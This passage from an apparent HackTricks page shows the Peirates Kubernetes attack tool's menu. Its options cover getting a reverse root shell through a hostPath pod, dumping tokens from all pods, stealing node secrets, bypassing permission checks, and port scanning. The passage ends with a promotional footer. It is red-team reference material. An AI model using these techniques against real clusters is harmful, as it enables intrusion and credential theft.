Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
